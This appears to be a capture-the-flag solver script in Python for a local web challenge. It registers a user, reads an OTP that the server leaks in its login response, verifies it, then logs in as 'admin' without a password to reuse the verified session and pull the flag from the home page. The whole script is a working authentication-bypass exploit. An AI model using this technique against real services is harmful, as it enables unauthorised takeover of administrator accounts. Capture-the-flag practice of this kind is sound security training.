import requests
import re

url = 'http://localhost:1337'

session = requests.Session()

# Register user
session.post(f'{url}/register', data={"username": "user1", "password": "pass1", "phone_number": "1234567891"})

# Login as user
response = session.post(f'{url}/login', data={'username': 'user1'})
otp = response.json().get('otp')
print(f"Received OTP: {otp}")

# Verify OTP for user
session.post(f'{url}/verify_otp', data={ 'otp': otp })

# Sign out
session.get(f'{url}/logout')

# Try login as admin
session.post(f'{url}/login', data={"username": "admin"})

# Access home page
response = session.get(f'{url}/home')
print(f"Home page content: {response.text}")
print("\033[1;32mFlag: "+re.findall(r'METACTF{.*}', response.text)[0]+"\033[00m")